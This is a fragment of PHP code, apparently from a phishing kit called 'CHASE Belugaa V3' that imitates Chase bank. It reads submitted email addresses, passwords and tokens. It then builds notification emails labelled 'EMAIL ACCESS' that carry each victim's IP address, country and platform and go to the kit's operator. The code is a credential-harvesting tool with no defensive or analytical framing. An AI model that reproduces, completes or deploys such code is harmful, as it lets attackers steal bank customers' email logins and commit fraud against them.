...
include '../../admin/YOUR-CONFIG.php';
	...
	$subject="#CHASE Belugaa EMAIL ACCESS 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
...
if(isset($_POST['email_address'])&&isset($_POST['email_password'])&&isset($_POST['token'])){
	...
	$subject="#CHASE Belugaa EMAIL ACCESS 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: CHASE Belugaa V3 <chase_Belugaa@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
